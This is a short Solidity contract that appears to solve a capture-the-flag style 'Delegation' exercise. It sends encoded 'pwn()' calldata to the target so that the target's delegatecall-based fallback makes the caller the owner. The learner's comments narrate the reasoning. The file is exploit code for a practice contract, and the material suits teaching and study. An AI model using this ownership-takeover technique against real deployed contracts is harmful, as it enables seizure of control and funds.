// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;
    Delegation private delegation;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        delegation = Delegation(_contractAddress);
    }

    function hackContract() external {
        // Code me!
        // If I pass in certain data in my message, it could invoke the pwn function I believe
        // The pwn function will set the owner to msg.sender, which should be me!!
        bytes memory cdata = abi.encodeWithSignature("pwn()");
        (bool success, bytes memory data) = address(delegation).call(cdata);
    }
}
